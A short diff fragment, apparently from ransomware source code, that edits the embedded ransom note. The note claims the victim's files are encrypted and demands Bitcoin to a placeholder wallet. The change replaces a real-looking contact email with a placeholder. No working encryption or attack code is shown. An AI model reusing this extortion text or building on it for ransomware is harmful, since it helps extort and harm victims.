@@ -14,7 +14,7 @@
              YOUR FILES ARE ENCRYPTED \n\
 ======================================================\n\
 All your important files have been encrypted.\n\
-To recover them, contact: vanld5@viettel.com.vn\n\
+To recover them, contact: your_mail@gmail.com\n\
 and send $10000000 in Bitcoin to the following wallet:\n\
     1ABCDeFgHiJkLmNoPQRstUvWxYz1234567\n\
 After payment, you will receive a decryption tool.\n\
